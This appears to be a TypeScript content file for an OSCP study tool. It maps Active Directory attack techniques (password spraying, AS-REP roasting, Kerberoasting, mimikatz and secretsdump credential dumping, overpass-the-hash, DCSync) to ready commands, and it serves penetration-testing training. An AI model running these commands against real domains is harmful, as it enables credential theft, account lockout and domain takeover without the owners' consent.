import type { OscpContent } from '@/types/oscp'

/** Phase: Active Directory authentication attacks. */
const adAttacks: OscpContent = {
    nodes: [
        {
            id: 'ad-password-spray',
            title: 'Password spraying',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'One password (or a season+year / company name) against every user. Always read the lockout policy first - a bad threshold locks the domain and ends your exam attempt.',
            commands: [
                {
                    label: 'Check policy, then spray',
                    code: `netexec smb <dc> -u <user> -p <pass> --pass-pol
netexec smb <dc> -u users.txt -p 'Autumn2024!' --continue-on-success
kerbrute passwordspray -d <domain> --dc <dc> users.txt 'Autumn2024!'`,
                },
            ],
            tags: ['spray', 'lockout', 'kerbrute', 'netexec'],
        },
        {
            id: 'ad-asrep-roast',
            title: 'AS-REP roasting',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Users with "Do not require Kerberos preauth" hand out a crackable AS-REP without any credentials. Crack with hashcat -m 18200.',
            commands: [
                {
                    label: 'Request AS-REP hashes',
                    code: `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc>
# with creds, auto-find:
impacket-GetNPUsers <domain>/<user>:<pass> -request -dc-ip <dc>`,
                },
            ],
            tags: ['as-rep', 'getnpusers', '18200', 'preauth'],
        },
        {
            id: 'kerberoast',
            title: 'Kerberoasting',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Any domain user can request the TGS of a service account (SPN) and crack it offline. Service accounts often have weak, non-expiring passwords. hashcat -m 13100.',
            commands: [
                {
                    label: 'Request TGS hashes',
                    code: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`,
                },
            ],
            tags: ['kerberoast', 'getuserspns', '13100', 'spn'],
        },
        {
            id: 'ad-dump-creds',
            title: 'Dump credentials (mimikatz/secretsdump)',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Once you are local admin on any domain host, pull cached hashes and tickets from LSASS. Domain-user creds here often unlock a higher-value account elsewhere.',
            commands: [
                {
                    label: 'Local + remote',
                    code: `# on host (mimikatz):
sekurlsa::logonpasswords
# remote with admin creds:
impacket-secretsdump <domain>/<user>:<pass>@<target>`,
                },
            ],
            tags: ['mimikatz', 'secretsdump', 'lsass', 'logonpasswords'],
        },
        {
            id: 'overpass-the-hash',
            title: 'Overpass-the-Hash (hash -> ticket)',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'Turn an NTLM hash into a Kerberos TGT, then use it for Kerberos-only services. Useful when PtH over SMB is blocked but Kerberos is open.',
            commands: [
                {
                    label: 'Hash -> TGT',
                    code: `impacket-getTGT <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <domain>/<user>@<target>`,
                },
            ],
            tags: ['overpass-the-hash', 'gettgt', 'kerberos', 'ptt'],
        },
        {
            id: 'dcsync',
            title: 'DCSync',
            type: 'technique',
            phase: 'ad-attacks',
            os: 'ad',
            description:
                'With replication rights (Domain Admin, or an account granted DS-Replication-Get-Changes-All), ask the DC to replicate secrets - including the krbtgt and Administrator hashes. This is game over.',
            commands: [
                {
                    label: 'Replicate all hashes',
                    code: `impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc
# targeted:
impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc-user Administrator`,
                },
            ],
            tags: ['dcsync', 'secretsdump', 'krbtgt', 'replication'],
        },
    ],
    edges: [
        { from: 'ad-password-spray', to: 'creds-found', label: 'hit' },
        { from: 'ad-asrep-roast', to: 'hash-to-crack', label: 'crack -m 18200' },
        { from: 'kerberoast', to: 'hash-to-crack', label: 'crack -m 13100' },
        { from: 'ad-dump-creds', to: 'creds-found', label: 'plaintext / reusable creds' },
        { from: 'ad-dump-creds', to: 'hash-to-crack', label: 'NTLM hashes' },
        { from: 'ad-dump-creds', to: 'dcsync', label: 'got replication rights' },
        { from: 'overpass-the-hash', to: 'psexec-lateral', label: 'ticket -> exec' },
        { from: 'dcsync', to: 'domain-admin', label: 'krbtgt / admin hash' },
        { from: 'creds-found', to: 'kerberoast', label: 'any domain user can roast' },
    ],
}

export default adAttacks
